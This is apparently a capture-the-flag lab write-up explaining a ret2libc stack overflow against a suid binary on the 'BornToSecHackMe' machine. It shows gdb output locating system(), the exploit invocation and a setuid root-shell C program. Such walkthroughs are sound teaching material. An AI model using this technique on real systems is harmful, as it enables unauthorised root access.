# Writeup 3 - ret2libc

> This writeup takes from [Writeup 1](../writeup1/README.md), having discovered `zaz` user's credentials.

Instead of writing our payload to the stack to execute it, we can use a "ret2libc" technique, which will jump to a libc function that will execute our payload.

## Preparation

Like the previous writeup, we first need access to a proper shell on the machine, here we use the `zaz` user account again, as it contains the `exploit_me` binary, needed for this exploit.

## Explanation

In the first `breadcrumbs` path, we simply execute the stack of the vulnerable suid binary to get a shell with elevated privileges. This works fine on this machine as the stack of this program is ***executable***: this means we can easily overwrite a return address with an address of a user-controlled shellcode.
With newer machines, and better security standards, the stack of a program is usually not executable, which makes the previous exploit unusable. This is where ***ret2libc*** or ***return to libc*** comes in. The idea behind this exploit is very similar, it is still a stack overflow attack, but instead of inputting an address pointing to a *shellcode* to run we point towards the memory location of the function `system()`, to which we can pass the path to a shell to be executed.

## Running the exploit

We first need to find the address of the `system()` function in libc, we can do this in `gdb`:
```
Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Next, we need to find somewhere in memory where the string `/bin/sh` is stored, so we can pass it to `system()` and execute it. We can either use the `strings` command to analyze loaded libraries (`libc.so`), or we can look into environment variables. A common environment variable that's set by the shell and already available to us is...
```bash
$ echo $SHELL
/bin/sh
```

Neat! Everything we need is already in memory, we just need to get our payload into an executable position via some ridiculously crafted offset aaaaanddddd:
```bash
$ SHELL=/bin/dash ./exploit_me $(echo -en $(python2 payload-ret2libc.py))
...
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```

And we're done! Almost.

A little bit of cleanup is needed:
```c
#include <stdlib.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```
# cc -o /tmp/final /tmp/final.c
# /tmp/final
root@BornToSecHackMe:~# id
uid=0(root) gid=0(root) groups=0(root)
```

pwned. 😎 (true hacker style)
